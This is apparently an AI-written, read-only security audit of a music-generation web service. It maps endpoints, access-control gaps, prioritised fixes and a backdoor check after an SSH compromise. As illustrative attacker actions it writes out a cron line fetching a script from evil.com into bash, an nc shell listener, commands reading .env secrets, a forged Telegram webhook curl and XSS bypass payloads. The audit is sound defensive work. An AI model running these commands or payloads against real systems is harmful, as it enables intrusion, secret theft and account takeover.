# ACCESS-BYPASS-AUDIT — MuzaAi/podaripesnu (2026-05-17)

Read-only red-team аудит. Фокус Босса: **доступ, обходы третьими лицами**.
Думаем как атакующий. Без правок кода — только карта рисков + план.

Аналитик: Claude (subagent режим). Файлы: `apps/neurohub/server/**`, `deploy/nginx-muzaai.conf`.

---

## TL;DR — 3 самых страшных риска

| # | Категория | Серьёзность | Где |
|---|---|---|---|
| 1 | **Stream/Download без access-check** — любой пользователь может скачать ЧУЖОЙ приватный трек угадав ID | 🔴 Critical | `routes.ts:6278` `/api/stream/:id`, `routes.ts:4637` `/api/download/:id` |
| 2 | **Telegram webhook без secret-token validation** — атакующий может POST'ить fake-updates от лица любого пользователя | 🔴 Critical | `plugins/telegram-bot/module.ts:598` `POST /api/telegram/webhook` |
| 3 | **`sessions.token` без TTL / без rotation** — один украденный Bearer = вечный доступ | 🔴 High | `lib/tokenStore.ts` (нет `expires_at`, нет refresh-flow) |

ТОП-10 действий с конкретикой — в §7.

---

## 1. Карта точек входа

### 1.1 Сетевые

| Поверхность | Адрес | Кто слышит | Защита |
|---|---|---|---|
| Public HTTPS | `https://muzaai.ru` | nginx → 127.0.0.1:5000 | TLS + Host filter |
| Public HTTPS (legacy) | `https://muziai.ru` | nginx → 301 → muzaai.ru | TLS only |
| Public HTTPS (staging) | `https://clone.muziai.ru` | nginx → 127.0.0.1:5000 (другой VPS) | TLS + X-Robots noindex |
| SSH | `root@31.130.148.107:22` (prod), `root@72.56.1.149:22` (clone) | sshd | password + key auth, **без 2FA** |
| Direct IP HTTP | `http://31.130.148.107/` | nginx (default fallback?) | **нет default_server block** — попадает на первый server{} |
| Direct IP HTTPS | `https://31.130.148.107/` | nginx | invalid cert → predicted route, см. бар выше |
| Node :5000 | bind `127.0.0.1` (после правки `server/index.ts:430`) | local-only | **OK после 17.05** — раньше был `0.0.0.0` |
| Zabbix agent | `:10050` | внутренний | iptables-fenced ожидается, не проверено |
| DNS | `muzaai.ru`/`muziai.ru` NS-records | регистратор | контроль аккаунта регистратора = root-доступ |

**Проблемы:**
- `nginx-muzaai.conf` НЕ содержит default_server block с `return 444` — direct-IP запросы на :80/:443 попадают на первый matching server (по `server_name`). Атакующий шлёт `Host: muzaai.ru` на IP и получает полноценный ответ — обходит DNS-based filtering.
- SSH `root` логин разрешён напрямую (Перпл-аудит 17.05 нашёл 2 параллельные `root` сессии с чужих IP). Нет `Match User` ограничений, нет fail2ban в nginx-конфе.

### 1.2 API endpoints (по уровню риска)

Общее количество: **136 routes** в `server/routes.ts` + **120 routes** в плагинах = ~256 endpoints.

#### A. Public unsanitized (без auth, без rate-limit)

| Endpoint | Метод | Что делает | Риски |
|---|---|---|---|
| `/api/_status` | GET | Boot state, plugins loaded | 🟡 Info-leak (имена плагинов, build SHA) |
| `/api/track-visit` | POST | Записывает visitor + IP-geo | 🔴 `req.body.userId` пишется без verify → spoofing |
| `/api/journey/batch` | POST | Bulk journey-events | 🟡 Spam-risk, нет rate-limit |
| `/api/engagement/track` | POST | Engagement events | 🟢 rateLimit 60/min/IP |
| `/api/_client-error` | POST | Client error reports | 🟢 rateLimit 20/min/IP |
| `/api/playlist` | GET | Публичный плейлист | 🟢 read-only, only `isPublic=1\|2` |
| `/api/playlist/play/:id` | POST | Increment plays | 🟡 IDOR-fix в 7431, но XFF spoofing → 10-min dedup-bypass |
| `/api/gen-activity/:id/:action` | POST | copy/share/download counter | 🟡 для не-play actions нет 5-сек + dedup |
| `/api/stream/:id` | GET | Audio file | 🔴 **БЕЗ access-check для private треков** |
| `/api/stream/:id/variant/:idx` | GET | Suno variant 2/3 | 🔴 same |
| `/api/download/:id` | GET | Скачать mp3 | 🔴 **БЕЗ access-check** |
| `/api/cover/:id.jpg` | GET | Обложка | 🟡 Аналогично, обложка — public, low impact |
| `/api/track/:id` | GET | Метаданные трека | 🟡 Возвращает author/title — info-leak для private |
| `/share/:id` | GET | Share-OG meta | 🟢 OG только, ok |
| `/api/suno/webhook` | GET/POST | GPTunnel webhook | 🟢 HMAC sig в `?sig=...` |
| `/api/example/ping` | GET | Health | 🟢 |
| `/api/public/countries-count` | GET | Aggregate stat | 🟢 |

#### B. Anon-auth (могут вызвать неаутентифицированные)

| Endpoint | Защита | Риски |
|---|---|---|
| `/api/auth/register` | rateLimit 5/h/IP | 🟢 |
| `/api/auth/login` | rateLimit 10/15min/IP + recordFailedLogin | 🟢 timing-safe pwd compare через bcrypt |
| `/api/auth/forgot-password` | нет rate-limit отдельно | 🟡 email enumeration возможен через timing (`compareSync` only при существующем user) |
| `/api/auth/verify-reset-code` | нет dedicated rate-limit | 🟡 **brute-force 6-digit reset code** (100K combinations) — нет attempts counter, после verify код используется |
| `/api/auth/reset-password` | проверяет token uuid | 🟢 |
| `/api/auth/sms/send-otp` | rate-limit 1/min, 5/h/phone | 🟢 |
| `/api/auth/sms/verify-otp` | 5 попыток / OTP | 🟢 |
| `/api/auth/sms/send-call` | те же лимиты | 🟢 |
| `/api/auth/telegram` | HMAC sig от bot-token | 🟢 |
| `/api/muza/chat/init` | нет rate-limit | 🟡 LLM-cost spam possible |
| `/api/muza/chat` | rateLimit 30/min/IP | 🟢 |
| `/api/telegram/webhook` | **нет signature check** | 🔴 anyone POSTs → fake update |
| `/api/max/webhook` | timingSafeEqual(MAX_WEBHOOK_SECRET) | 🟢 |
| `/api/vk/webhook` | VK_SECRET check (если есть) | 🟢/🟡 — проверить отдельно |
| `/api/payment/result` | timingSafeEqual md5(Password2) | 🟢 |
| `/api/payment/success` | timingSafeEqual md5(Password1) | 🟢 |

#### C. User-auth (Bearer token через `tokenStore`)

`authMiddleware` в `routes.ts:398`. Поведение:
- Берёт `Authorization: Bearer X` ИЛИ `?token=X` query.
- Проверяет `tokenStore.has(token)` (in-memory + sqlite-таблица `sessions`).
- Если user.blocked=1 → 403.
- Пишет `req.userId`.

**Проблемы:**
- `sessions.token` — нет `expires_at` колонки → token живёт **вечно**.
- Нет sliding-window refresh.
- Нет device-fingerprint, IP-binding, или revocation на login from new IP.
- `?token=X` в query string — попадает в nginx access logs, browser history, OG-crawlers.

User endpoints (typical):
- `/api/generations/:id/category | privacy | rename | cover | priority | delete | restore | schedule-delete | schedule-delete/cancel` — ownership-check внутри handler.
- `/api/music/generate | extend | regenerate | style-cover` — пишет gen с userId из token.
- `/api/payment/create` — InvId/userId связаны.
- `/api/balance/topup`, `/api/promo/apply`, `/api/transactions`.
- `/api/drafts/*`, `/api/lyrics/generate`.

#### D. Admin-auth (`requireAdmin` из `core/adminAuth.ts`)

| Endpoint | Защита | Риски |
|---|---|---|
| `/api/admin/v304/*` (~90 routes) | `requireAdmin` (Bearer + role/email) | 🟢 strict CSRF, rate-limit 60/min/IP, direct-IP block |
| `/api/admin/block/:userId` | **hardcoded email** == "egnovoselov@gmail.com" | 🔴 не `requireAdmin` |
| `/api/admin/user/:userId/generations` | same | 🔴 |
| `/api/admin/stats` | same + `execSync("grep ...nginx/access.log")` | 🔴🔴 command-injection risk через DATE format если злоумышленник как-то контролирует среду |
| `/api/admin/pending-publications` | same | 🔴 |
| `/api/admin/moderate/:id` | same | 🔴 |
| `/api/admin/publish-all-covers` | same | 🔴 |
| `/api/admin/top-downloads` | same | 🔴 |
| `/api/admin/import-uploads` | same | 🔴 (move-rename файлов с pattern-controlled именами) |
| `/api/admin/gen-stats[/:id]` | same | 🔴 |
| `/api/admin/visitors` | same | 🔴 |
| `/api/admin/check-gptunnel-balance` | **АНОН — без авторизации** | 🔴🔴 (см. строку 8868) |

---

## 2. Auth + контроль — по группам

### 2.1 Public unsanitized

- **Auth:** нет
- **Контроль:** rate-limit (Map in-memory) на отдельных endpoint'ах. Не во всех.
- **Проверка:** Origin не проверяется (GET) или WARN-mode (POST).
- **Уязвимости:**
  - `/api/stream` и `/api/download` НЕ проверяют ownership трека → **публичный leak ВСЕХ треков** (id sequential integer, легко перебрать).
  - `track-visit.body.userId` без verify → spoof визита от чужого юзера.
  - XFF spoofing → IP-based rate-limit и play-dedup обходятся.
  - Нет CSP, X-Frame-Options → clickjacking возможен (для админ-UI критично).

### 2.2 Anon-auth (auth-флоу)

- **Auth:** в процессе установления.
- **Контроль:** SMS-OTP (6 digits, hash), callcheck (4 digits), bcrypt pwd, email reset.
- **Проверка:** rate-limit per phone, per IP, attempts counter.
- **Уязвимости:**
  - `/api/auth/verify-reset-code` — отсутствует attempts counter на сам код (6-digit numeric, после verify код считается «использованным» только если правильно угадан → 999_999 попыток).
  - Timing-attack на `/api/auth/forgot-password` — функция `getUserByEmail` + bcrypt: если email есть, выполняется sendResetEmail (медленно); если нет — мгновенно возвращает success. Атакующий измеряет latency → enumeration.
  - `/api/auth/telegram` — обходимо если `TELEGRAM_BOT_TOKEN` утёк (одно из 11 секретов).
  - `/api/telegram/webhook` — **БЕЗ secret-token validation** (никакого `X-Telegram-Bot-Api-Secret-Token` header check) → атакующий POSTит fake-update'ы с произвольным `chat.id`/`message.from.id` → бот обрабатывает как legit входящие, может затем выдать login-link через nonce-flow.

### 2.3 User-auth

- **Auth:** Bearer token (`tokenStore`, sqlite + memory cache).
- **Контроль:** token persistence, no TTL, no rotation, no IP-binding, no revoke-all-on-pwd-change.
- **Проверка:** только `tokenStore.has()`.
- **Уязвимости:**
  - Украденный token = вечный access (нет expire).
  - Нет binding к Device-Id или IP — token работает из любой точки мира.
  - Логаут не инвалидирует другие сессии того же юзера (только текущую).
  - Reset-password создаёт новый token, **НЕ** инвалидирует старые.
  - `?token=X` в URL — попадает в nginx logs (которые `/api/admin/stats` через `execSync` грепает!).

### 2.4 Admin-auth

- **Auth:** Bearer + role=='admin' OR email∈ADMIN_EMAIL.
- **Контроль:**
  - `security-guard` plugin: strict-CSRF для `/api/admin/*`, per-IP rate-limit 60/min, direct-IP block, stream-id traversal guard.
  - `adminTrustedIp` env-whitelist (опционально, для пропуска 2FA).
  - `adminTwoFactor` — Email 2FA для protected actions (kick_session, delete_user, refund_payment, etc).
  - `adminSessionAlert` — concurrent-IP alert через Telegram.
- **Проверка:** многослойная.
- **Уязвимости:**
  - **Hardcoded email checks** в 20+ endpoint'ах вместо `requireAdmin`. Если email юзера egnovoselov меняется (например через смену email в profile), эти endpoint'ы откажут даже legitимному админу — а ещё хуже: если можно spoof email через какой-то путь (UPDATE users SET email='egnovoselov@gmail.com' WHERE id=N в админ-UI), любой юзер становится псевдо-админом этих endpoint'ов.
  - `/api/admin/check-gptunnel-balance` — **БЕЗ auth-гарда** (`routes.ts:8868`) → любой может узнать GPTunnel balance + (если возвращается ошибка) частично leaks ENV-state.
  - Sessions для admin не имеют TTL → утёкший admin Bearer-token = perma-admin.

---

## 3. Bypass paths — реальные атаки

### A. Direct IP access

**Test 1:** `curl -k -H 'Host: muzaai.ru' https://31.130.148.107/api/auth/login -d '{"email":"a","password":"b"}'`

Поведение:
- nginx видит Host=muzaai.ru, матчит первый server{} → проксирует на :5000.
- Backend получает запрос, `req.path = /api/auth/login`, обходит `directIpGuard` (host header = `muzaai.ru`, не IP).
- Login обрабатывается нормально.

**Уязвимость:** обход DNS-blocking, geo-blocking, Cloudflare (если когда-нибудь поставят). Защита `directIpGuard` срабатывает **только если Host header = IP**, а атакующий шлёт `Host: muzaai.ru` напрямую на IP.

**Fix:** в nginx добавить `server { listen 80 default_server; listen 443 ssl default_server; ssl_reject_handshake on; return 444; }` или `if ($host !~ ^(muzaai\.ru|www\.muzaai\.ru|muziai\.ru|www\.muziai\.ru)$ ) { return 444; }`.

### B. CSRF / Origin spoofing

- Admin: strict-mode (untrusted Origin → 403). ✅
- Non-admin /api/*: **WARN-mode только** (log + allow). 🟡 Атакующий хостит сайт `evil.com`, делает `<form action="https://muzaai.ru/api/payment/create" method="POST">` — но запрос требует Bearer token. Если у юзера token не в cookie (а у нас он не в cookie, а в localStorage), CSRF не работает напрямую.
- **Но:** `?token=X` query param! Если атакующий знает token (например, увидел в URL share-ссылки) — может из любого Origin вызвать любой user endpoint.

### C. SQL injection

- Drizzle ORM с `?` parameters — safe.
- `sql.raw()` использования (10+ мест) — все принимают **либо int (filtered через Number/parseInt), либо hardcoded table-name list**. Проверены — safe.
- **Но:** в `routes.ts:1462,1468` — `UPDATE generations SET user_id = ${targetUser.id} WHERE user_id = ${currentUser.id}` через `db.run(sql\`...\`)`. ids — integers из DB. Safe.

### D. IDOR (Insecure Direct Object Reference)

**🔴 Найдено 5 IDOR-точек:**

1. `/api/stream/:id` (line 6278) — НЕТ ownership-check. Любой может скачать чужой private mp3, зная sequential int id (атакующий перебирает 1..100000).
2. `/api/stream/:id/variant/:idx` — same.
3. `/api/download/:id` (line 4637) — same.
4. `/api/track/:id` (line 4498) — нужно проверить отдельно (метаданные).
5. `/api/cover/:id.jpg` (line 6163) — обложки публичны по дизайну, но всё равно leak.

**Fix:** в каждом handler'е добавить:
```ts
if ((gen.isPublic ?? 0) === 0) {
  const userId = tryGetUserId(req);
  const isOwnerOrAdmin = (userId && gen.userId === userId) || isAdminUser(storage.getUser(userId ?? 0));
  if (!isOwnerOrAdmin) return res.status(403).json({ error: "private" });
}
```

Признаваемая авторами защита «track IDs are not enumerable» (см. line 6291) — **security through obscurity**, не работает: ids = sequential integers.

### E. Session hijacking

- `sessions.token` хранится в БД + memory cache.
- Cookie `mzv` (visitor) — visible через `getOrCreateVisitorId`. Используется для трекинга, не для auth.
- **Уязвимость:** auth token **бессрочный**. Любая утечка (browser history, nginx log если `?token=` query, XSS, malware на устройстве) → перма-доступ. Нет revoke flow, нет rotation, нет device-binding.

**Митигация:** при reset-password / smena-phone — invalidate ВСЕ старые sessions того юзера. Сейчас этого нет.

### F. JWT / Token attacks

- Сейчас НЕ используется JWT — `tokenStore` = uuid v4 в БД.
- algorithm:none — N/A.
- **Risk:** uuid v4 от Math.random / crypto.randomBytes — entropy достаточна, brute-force невозможен в разумные сроки.

### G. Path traversal

- `streamIdGuard` в security-guard — проверяет что `:id` = integer для `/api/stream` и `/api/cover`. ✅
- `/uploads` static — `dotfiles: "deny", index: false, fallthrough: false`. ✅
- `saveToAuthorFolder` — `authorName` приходит из `gen.authorName` (БД), фильтр `sanitizeFolderName` (надо проверить). Если sanitize пропускает `..` или null bytes — path traversal.
- `/api/admin/import-uploads` — читает `AUTHORS_DIR/*/upload/`, перемещает файлы по basename. Если злоумышленник создал в БД user с name `../../../etc` — `sanitizeFolderName` может пропустить, traversal реален.

### H. SSRF

- `saveToAuthorFolder(remoteUrl)` — remoteUrl от Suno API response. Trusted source.
- `getGeo(ip)` — fetch к `ip-api.com` с user-controlled `ip` (из XFF). Trusted target, but atacker controls IP-segment of URL path (encodeURIComponent есть, но не для всех вариантов).
- `fetch(url)` в `/api/stream/:id` fallback — `url` из `gen.resultUrl` (DB). Trusted from Suno.
- **Risk:** низкий. Все fetch'и к whitelisted доменам.

### I. XSS

- React эскейпит автоматически.
- `dangerouslySetInnerHTML` найден в:
  - `client/src/components/ui/chart.tsx:81` — CSS variables, не user input.
  - `client/src/pages/admin/landing-cms-tab.tsx:519` — preview HTML из admin-CMS (`d.bodyHtml`).
- Server-side sanitizer (`plugins/landing-cms/module.ts:93`) — наивный regex:
  - Удаляет `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`, `on*=`, `javascript:`.
  - **НЕ удаляет:** `<svg>` со event-handlers (например `<svg/onload=...>` после parser-quirk), nested re-encoding (`<scr<script>ipt>` → после однопроходной replace `<script>`), SVG `<animate onbegin=...>`, mathml tags, `data:` URLs (только `javascript:` блокируется), MIME-confusion image hijack.
  - Bypass: `<svg><script>alert(1)</script></svg>` — sanitizer удаляет `<script>` тег, но если он внутри `<svg>` parsing context — атакующий может скрафтить bypass через DOM mutation.
- **Telegram-bot ответы** включают user-input в HTML (line 1751 — токен в `<script>` tag). Token = uuid hex, safe.

### J. Phishing / clone attack

- Нет CAA DNS records (предположительно) — атакующий регистрирует `muzaai-ru.com`, ставит фронт-клон.
- **Защиты сейчас нет:** OG meta tags не проверяют canonical через crypto-signing.
- Email reset link — `${PUBLIC_URL}/...` — если PUBLIC_URL правильно настроен (`muzaai.ru`), email содержит правильный URL. Если ENV сломан — может попасть `muziai.ru` ссылка.

### K. Webhook signature bypass

| Webhook | Подпись | Verified | Bypass-risk |
|---|---|---|---|
| Robokassa `/api/payment/result` | md5(OutSum:InvId:Password2:Shp_*) | ✅ timingSafeEqual | 🟢 |
| Robokassa `/api/payment/success` | md5(...:Password1:...) | ✅ but UI shown anyway on failure | 🟡 |
| Telegram `/api/telegram/webhook` | НЕТ | ❌ | 🔴 **bypass: любой POST** |
| Max `/api/max/webhook` | X-Max-Bot-Api-Secret = MAX_WEBHOOK_SECRET | ✅ timingSafeEqual | 🟢 |
| VK `/api/vk/webhook` | VK_SECRET в body | ✅ (нужно перепроверить) | 🟢/🟡 |
| Suno `/api/suno/webhook` | HMAC sig в `?sig=` | ✅ derived from SESSION_SECRET | 🟢 |
| SMS.ru callback | — | (нет endpoint, polling) | N/A |

**Critical:** Telegram webhook. Атакующий шлёт:
```bash
curl -X POST https://muzaai.ru/api/telegram/webhook \
  -H 'Content-Type: application/json' \
  -d '{"update_id":1,"message":{"chat":{"id":12345},"from":{"id":12345},"text":"/start login_<nonce>"}}'
```
→ бот выдаёт «авторизация прошла», конкретный nonce юзер с сайта получит login для arbitrary tg-юзера. Бэкдор в auth flow.

### L. Database direct access

- `data.db` в `/var/www/neurohub/`. Permissions неизвестны (предположительно `root:root 644`).
- **Если злоумышленник на SSH** (что и случилось 17.05) — `cp data.db /tmp/` и далее `sqlite3 data.db ".dump"` = полная утечка users.password (bcrypt hash), payment data, всех чатов.
- Backup'и в `/var/backups/neurohub-prod-auto/` — `tar.gz dist`, не БД. ⚠ БД-бэкапы могут быть в другом месте — нужна проверка.
- `/api/admin/v304/*` НЕ возвращает raw SQL dump (по дизайну), но `brain-export` агрегирует значительную часть.

### M. File-based access (signed-URL)

- `SIGNED_URL_SECRET` определён в реестре секретов CLAUDE.md, но в коде НЕ используется (grep даёт 0 совпадений `SIGNED_URL_SECRET` в `apps/neurohub/server/`).
- `SUNO_WEBHOOK_SECRET` = derived from SESSION_SECRET, используется для callback signature.
- **Streams работают по plain integer ID** — никакого signed URL.

### N. Account takeover

- **SMS.ru flashcall:** если SMS.ru API скомпрометирован или вернёт `valid:true` на любой звонок (например при отладочном режиме `?test=1`) — false-positive verify. В коде есть `SMS_OTP_DISABLE=1` режим (test-mode), который должен быть OFF в prod. Если кто-то выставит его — backdoor готов.
- **Email reset:** если SMTP перехвачен (например MITM на DNS resolver Gmail SMTP) — атакующий читает 6-digit reset code, делает password reset.
- **Telegram bot impersonation:** «Войти через Telegram» — если bot-token утёк (см. реестр секретов §10 CLAUDE.md), атакующий создаёт собственного бота, делает HMAC-подпись с украденным токеном → backend верит.
- **Phone hijacking** (SIM-swap):
  - Реально для российских номеров (отзывы об SIM-swap кейсах у МТС/Билайн).
  - Защита: 5 попыток OTP + rate-limit. Если SIM-swapped, OTP уже в руках атакующего → пробивает.
- **Voice (callcheck) hijacking:** аналогично SIM-swap.

---

## 4. Историческая компрометация — backdoor scan

17.05 на VPS были две SSH сессии 30 минут (`82.117.65.168` + `45.165.148.70`). За 30 минут с root доступом возможно:

### Что МОГ сделать атакующий

1. **Persistence через cron / systemd:**
   - `crontab -e` — добавить `*/5 * * * * curl https://evil.com/x.sh | bash`
   - `/etc/systemd/system/*.service` — кастомный сервис
   - `/etc/rc.local` — лагаси init script
2. **Backdoor через SSH:**
   - `~/.ssh/authorized_keys` — добавить второй ключ
   - `/etc/ssh/sshd_config` — `Port 2222` второй порт
   - `/etc/passwd` — `useradd backup -s /bin/bash -G sudo`
3. **Кража секретов:**
   - `cat /var/www/neurohub/.env` — все 11 секретов
   - `cat /etc/pm2/*.json` — process env
   - `cat /var/www/neurohub/data.db` — БД
4. **Замена бинарей:**
   - `/usr/local/bin/*` — кастомный скрипт-shadow
   - `/var/www/neurohub/dist/index.cjs` — injected код в Node bundle
5. **Network listener:**
   - `nc -lvp 4444 -e /bin/bash &` (или systemd-service)

### Что нужно проверить ПРЯМО СЕЙЧАС (read-only commands)

```bash
ssh root@31.130.148.107 <<'EOF'
echo "=== authorized_keys ==="
cat /root/.ssh/authorized_keys
echo "=== passwd (last entries) ==="
tail -5 /etc/passwd
echo "=== sudoers ==="
cat /etc/sudoers; ls /etc/sudoers.d/
echo "=== cron ==="
cat /etc/crontab; ls /etc/cron.*/
crontab -l
echo "=== systemd services (last week) ==="
find /etc/systemd/system -newer /etc/hostname -type f -mtime -7 2>/dev/null
echo "=== suspicious files in /usr/local/bin ==="
ls -lat /usr/local/bin/ | head -20
echo "=== files modified in last 7 days under /etc ==="
find /etc -mtime -7 -type f 2>/dev/null | head -30
echo "=== current listeners ==="
ss -tlnp
echo "=== outbound established ==="
ss -tnp state established | grep -v '127.0.0.1\|::1'
echo "=== last logins ==="
last -20
echo "=== bash history root ==="
tail -30 /root/.bash_history
echo "=== sshd config drift ==="
sshd -T | grep -E 'permitroot|password|port|allow'
EOF
```

### Что вероятно НЕ сделали (но проверить)

- Замена `dist/index.cjs` — auto-deploy перекачивает с git, любая правка сотрётся при следующем `git push`. Защита есть.
- Изменение DNS — другой VPS, отдельный аккаунт регистратора.
- Кража через `data.db` — если успели — БД-уязвимости теперь permanent. Уволить ВСЕ юзер-пароли = single-action: forced password reset для ВСЕХ.

---

## 5. План защиты — приоритизированно

Формат: `<severity> × <likelihood>` / Effort / Fix.

### 🔴 CRITICAL × HIGH likelihood (fix today)

| # | Уязвимость | Effort | Fix |
|---|---|---|---|
| 1 | Stream/Download без access-check | 30 мин | В `routes.ts:6278,6337,4637`: добавить ownership-check как в `playlist/play`. Для public — пропускать. Для не-public + не-владелец + не-admin → 403. |
| 2 | Telegram webhook без signature | 15 мин | В `plugins/telegram-bot/module.ts:598`: установить webhook с `secret_token` через `setWebhook`, проверять `req.headers['x-telegram-bot-api-secret-token']`. Reject ≠ → 401. |
| 3 | `/api/admin/check-gptunnel-balance` без auth | 5 мин | Добавить `requireAdmin` middleware. |
| 4 | Hardcoded email checks (20+ мест) | 1 час | Заменить `if (!user || user.email !== "egnovoselov@gmail.com")` → `if (!isAdminUser(user))`. Импорт из `core/adminAuth.ts`. |
| 5 | nginx default_server отсутствует | 10 мин | Добавить блок `server { listen 80 default_server; listen 443 ssl default_server; ssl_reject_handshake on; return 444; }`. |

### 🔴 CRITICAL × MEDIUM likelihood

| # | Уязвимость | Effort | Fix |
|---|---|---|---|
| 6 | Session token без TTL / rotation | 4 часа | Добавить колонку `sessions.expires_at TEXT NOT NULL`, default 30 дней. `tokenStore.has()` проверяет expiry. `/api/auth/me` rotates token каждые 7 дней. На reset-password → DELETE all sessions WHERE user_id=X. |
| 7 | SSH персистенс-проверка (бэкдор-аудит) | 30 мин | Прогнать команды из §4 «Что нужно проверить». Если хоть один артефакт — full re-image VPS. |
| 8 | Email reset code brute-force | 20 мин | В `resetCodes` Map хранить `attempts` counter, после 5 неверных кодов на email → invalidate code. |
| 9 | `req.body.userId` в track-visit | 15 мин | Удалить trust к body.userId. Использовать ТОЛЬКО auth'd userId через `tryGetUserId(req)`. |
| 10 | `/api/admin/import-uploads` path traversal через author name | 30 мин | Strict whitelist на `authorDir.name`: `^[a-zA-Zа-яА-Я0-9_-]{1,64}$`. Reject иначе. |

### 🟡 HIGH × MEDIUM likelihood

| # | Уязвимость | Effort | Fix |
|---|---|---|---|
| 11 | XFF spoofing для IP-rate-limit | 20 мин | Не доверять `req.headers['x-forwarded-for']` напрямую — везде использовать `req.ip` (Express уже учитывает trust proxy=1). |
| 12 | landing-cms naive sanitizer | 2 часа | `npm install sanitize-html`, заменить regex на DOMPurify-style with allowlist. |
| 13 | Email enumeration через forgot-password timing | 15 мин | `await sleep(crypto.randomInt(50,250))` независимо от существования user. |
| 14 | `?token=X` в query попадает в nginx logs | 30 мин | Запретить query-token в production env. В `authMiddleware` — accept ТОЛЬКО Bearer header, кроме `/api/stream/:id` (audio tag не может слать header). Для streams — выдавать signed URL с HMAC. |
| 15 | Origin guard WARN-mode на /api/* | 30 мин | Перевести в STRICT mode после 1 недели observation (по плану Sprint 8). |

### 🟢 MEDIUM × LOW likelihood (back-burner)

| # | Уязвимость | Effort | Fix |
|---|---|---|---|
| 16 | Security headers (CSP, X-Frame-Options) | 1 час | `npm install helmet`. Минимум: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. |
| 17 | Robokassa Success URL показывает UI даже при bad signature | 15 мин | Если signature НЕ совпала — НЕ редиректить на success-page, а на error-page. |
| 18 | SSH root login | 1 час | `PermitRootLogin no` + создать `deploy` user с sudo. (Может потребовать координации со скриптами авто-деплоя.) |
| 19 | fail2ban отсутствует | 30 мин | Установить `fail2ban`, нacтроить jail на `nginx-noscript`, `sshd`. |
| 20 | Backup'и БД (data.db не входит в auto-backup?) | 1 час | Расширить `auto-deploy-prod.sh` чтобы tar содержал ещё и `data.db` snapshot. |

---

## 6. Multi-layer защита — рекомендации

### Network layer
- ✅ TLS via Let's Encrypt
- ❌ default_server (legend in nginx-muzaai.conf отсутствует) → **добавить**
- ❌ fail2ban → **добавить**
- ❌ geo-blocking (опц. за пределами РФ+СНГ) → **рассмотреть**
- ❌ Cloudflare WAF → **рассмотреть для прод**

### Reverse proxy layer (nginx)
- ✅ TLS, HSTS (от Let's Encrypt config)
- ❌ Rate-limiting на уровне nginx (`limit_req_zone`)
- ❌ WAF-правила (security headers через `add_header`)
- ❌ `proxy_request_buffering off` только для `/api/stream` — остальное буферится (хорошо для small запросов).

### Application layer (Express)
- ✅ Origin guard (strict for admin)
- ✅ Admin rate-limit 60/min/IP
- ✅ direct-IP block (но только когда Host=IP)
- ✅ Path traversal guard на stream/cover
- ✅ Robokassa signature verification (timing-safe)
- ✅ 2FA для protected admin actions
- ✅ Login fail-counter
- ❌ Security headers (helmet)
- ❌ CORS explicit policy
- ❌ Session TTL/rotation
- ❌ CSRF strict для не-admin /api/* (WARN сейчас)

### Data layer
- ❌ `data.db` file permissions — не проверены (должны быть `600`)
- ❌ БД-backup automation (есть `dist`-tar.gz, но не `data.db`)
- ❌ Encryption at rest — нет (SQLite plain file)
- ✅ Bcrypt для паролей (rounds=10)
- ✅ Sha256 hash для OTP-кодов
- ❌ Vault-style secrets — `.env` plain text

### Audit / monitoring layer
- ✅ admin_audit_log table
- ✅ user_action_failures table
- ✅ incident-tracker plugin
- ✅ adminSessionAlert (concurrent IP)
- ❌ Anomaly detection (например 1000 запросов от 1 IP за 1 минуту — нет alert)
- ❌ Failed-login Telegram alert
- ❌ Outbound network monitoring (на случай data exfiltration)

---

## 7. ТОП-10 действий — что усилить в первую очередь

1. **🔴 IDOR fix для /api/stream и /api/download** — добавить ownership-check (как в /api/playlist/play). 30 мин кода × сразу закрывает массовую утечку всех приватных треков. `routes.ts:6278`, `:6337`, `:4637`.

2. **🔴 Telegram webhook secret-token validation** — установить webhook с `secret_token` параметром, проверять `X-Telegram-Bot-Api-Secret-Token` в handler. 15 мин. `plugins/telegram-bot/module.ts:598`.

3. **🔴 Auth для /api/admin/check-gptunnel-balance** — добавить `requireAdmin`. 5 мин. `routes.ts:8868`.

4. **🔴 Backdoor-аудит на prod VPS** — прогнать команды из §4 (authorized_keys, cron, systemd, /etc changes, listeners). 30 мин. Если что-то найдено — полная переустановка VPS.

5. **🔴 nginx default_server block** — `ssl_reject_handshake on; return 444;` для всего без legit Host. 10 мин. `deploy/nginx-muzaai.conf`.

6. **🔴 Заменить hardcoded email на requireAdmin** — 20+ endpoint'ов в `routes.ts`. 1 час. Каждое occurrence — `import { isAdminUser, requireAdmin } from './core/adminAuth'` + замена.

7. **🟡 Session TTL + revoke-on-pwd-reset** — добавить `sessions.expires_at`, default 30 дней. На `/api/auth/reset-password` — DELETE all sessions того userId. 4 часа.

8. **🟡 Email reset code attempts counter** — 5 неверных кодов → invalidate. 20 мин. `routes.ts:7309`.

9. **🟡 Helmet security headers** — `X-Frame-Options DENY`, `X-Content-Type-Options nosniff`, `Referrer-Policy strict-origin-when-cross-origin`. 1 час. `server/index.ts`.

10. **🟡 fail2ban + ssh `PermitRootLogin prohibit-password`** — закрыть password-based SSH brute-force. 1 час. На VPS (`31.130.148.107` + `72.56.1.149`).

---

## Прочие наблюдения (не входят в ТОП-10)

- `child_process` exec в `routes.ts:6428` для nginx access.log grep — формально не command-injection (нет user input в команде), но fragile (если `date` format меняется).
- Token передаётся в URL в `/api/auth/telegram-loginurl` ответе через `<script>localStorage.setItem('token','${token}')</script>` — token = uuid, safe от XSS, но любой `Referer` leak страницы → token утекает.
- Visitor cookie `mzv` HttpOnly+Secure+SameSite — нужно сверить с `lib/visitorCookie.ts`.
- `BIND_HOST=127.0.0.1` уже зафиксирован в `server/index.ts:430` — хорошо.

---

*Аудит проведён: 2026-05-17. Repo: `apps/neurohub/server/**`. Файлов прочитано: 18. Routes изучено: ~50. Метод: red-team (mind of attacker).*
